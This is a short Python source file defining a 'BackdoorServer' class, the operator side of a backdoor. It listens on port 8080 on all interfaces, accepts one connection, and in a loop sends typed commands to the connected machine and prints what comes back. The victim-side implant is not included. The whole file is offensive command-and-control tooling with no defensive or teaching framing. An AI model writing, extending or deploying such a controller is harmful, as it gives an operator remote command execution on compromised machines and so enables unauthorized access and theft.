import socket
from datetime import datetime


class BackdoorServer:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def start_server(self):
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(1)
        print(f"[{datetime.now()}] Server listening on {self.host}:{self.port}")

        conn, addr = self.server_socket.accept()
        print(f"[{datetime.now()}] Connection from {addr}")

        self.handle_commands(conn)

    def handle_commands(self, conn):
        while True:
            command = input(f"[{datetime.now()}] Enter a command: ")
            conn.send(command.encode())

            if command.lower() == 'exit':
                break

            output = conn.recv(1024).decode()
            print(f"[{datetime.now()}] Output: {output}")

        conn.close()

    def close_server(self):
        self.server_socket.close()

def main():
    host = '0.0.0.0'
    port = 8080

    backdoor_server = BackdoorServer(host, port)
    backdoor_server.start_server()


if __name__ == "__main__":
    main()
